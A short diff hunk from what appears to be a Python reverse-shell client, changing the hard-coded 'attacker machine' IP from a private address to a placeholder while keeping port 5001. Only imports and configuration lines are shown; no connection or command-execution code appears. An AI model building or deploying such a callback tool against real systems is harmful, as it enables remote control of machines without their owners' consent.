@@ -4,7 +4,7 @@ from subprocess import getoutput
 from os import chdir, getcwd
 
 # Define the ip address and port of the server (attacking machine)
-attacker_ip = "192.168.107.129"
+attacker_ip = "XXX.XXX.XXX.XXX"
 attacker_port = 5001
 
 
